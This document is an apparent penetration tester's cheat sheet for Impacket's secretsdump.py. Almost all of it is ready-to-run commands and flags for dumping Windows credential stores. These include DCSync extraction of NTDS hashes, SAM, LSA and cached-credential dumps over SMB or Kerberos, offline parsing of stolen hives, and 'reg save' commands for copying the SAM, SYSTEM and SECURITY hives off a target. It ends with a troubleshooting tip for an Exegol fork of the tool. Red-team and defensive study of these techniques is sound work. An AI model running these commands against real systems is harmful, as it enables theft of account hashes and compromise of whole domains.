Impacket tool for dumping secrets from Windows hosts (SAM, LSA, NTDS).
## Common modes

```bash
# Local SAM + LSA + cached creds over SMB (admin creds required)
secretsdump.py 'DOMAIN/user:pass@host'

# DCSync — dump everything from NTDS via DRSUAPI (needs replication rights)
secretsdump.py -just-dc 'DOMAIN/user:pass@dc'

# DCSync — NT hashes only (faster, quieter)
secretsdump.py -just-dc-ntlm 'DOMAIN/user:pass@dc'

# DCSync — single user (bypasses SPN validation policy)
secretsdump.py -just-dc-user Administrator 'DOMAIN/user:pass@dc'

# With a Kerberos ticket instead of password
KRB5CCNAME=ticket.ccache secretsdump.py -k -no-pass dc.domain.tld
```

## Local / offline dumping (from hive files)

When you've exfiltrated registry hives (or have `NTDS.dit` from a DC), dump them offline — no network, no creds needed.

```bash
# SAM + SYSTEM → local account NT hashes
secretsdump.py -sam SAM -system SYSTEM LOCAL

# SAM + SECURITY + SYSTEM → local hashes + LSA secrets + cached domain creds
secretsdump.py -sam SAM -security SECURITY -system SYSTEM LOCAL

# NTDS.dit + SYSTEM → full domain dump (offline DCSync equivalent)
secretsdump.py -ntds NTDS.dit -system SYSTEM LOCAL

# NTDS.dit only (if SYSTEM key already known / bootkey supplied)
secretsdump.py -ntds NTDS.dit -bootkey <BOOTKEY> LOCAL
```

The literal string `LOCAL` at the end tells secretsdump to work from files instead of connecting to a host.

### Grabbing the hives (on target)

```cmd
:: From an admin shell on the target
reg save HKLM\SAM      C:\Windows\Temp\SAM
reg save HKLM\SYSTEM   C:\Windows\Temp\SYSTEM
reg save HKLM\SECURITY C:\Windows\Temp\SECURITY
```

For `NTDS.dit` on a DC → use `ntdsutil` snapshot or VSS; file is locked while AD is running.

## Useful flags

| Flag | Purpose |
|------|---------|
| `-k -no-pass` | Use Kerberos ticket from `KRB5CCNAME` |
| `-just-dc` | Dump NTDS (hashes + Kerberos keys) |
| `-just-dc-ntlm` | NT hashes only |
| `-just-dc-user <user>` | Dump a single account |
| `-use-vss` | VSS shadow-copy method (SMB/CIFS transport) |
| `-target-ip <ip>` | Skip hostname resolution |
| `-debug` | Force full output (works around silent-exit bugs) |

## Transport / SPN cheatsheet

- DCSync via DRSUAPI → RPC over SMB → needs **`cifs/<dc>`** SPN in ticket
- `-use-vss` → also SMB → **`cifs/<dc>`**
- LDAP-only operations → `ldap/<dc>`

A ticket for the wrong SPN will silently fail ("Changing sname ... and hoping for the best").

---

## ⚠️ Exegol gotcha : `-use-ntds`

**Exegol ships `theporgs/impacket` (a fork), not stock Fortra Impacket.** The fork requires an explicit `-use-ntds` flag to perform DCSync / NTDS dumps. On Kali / stock Impacket this is the default.
#### Symptom
```
[+] Using Kerberos Cache: ...
[+] Using TGS from cache
[*] Cleaning up...
```
Silent exit. No hashes. No error. `-debug` doesn't help. Looks identical to SPN validation failures, broken delegation, clock skew, etc. — it's a trap.
#### Fix
Add `-use-ntds` to any DCSync invocation:
```bash
KRB5CCNAME=admin@cifs_dc.domain.tld@DOMAIN.TLD.ccache \
  secretsdump.py -k -no-pass dc.domain.tld \
  -just-dc-user Administrator --use-ntds
```

> On Exegol → always add `-use-ntds` for DCSync (`-just-dc`, `-just-dc-ntlm`, `-just-dc-user`).
> On Kali / Fortra Impacket → don't need it.
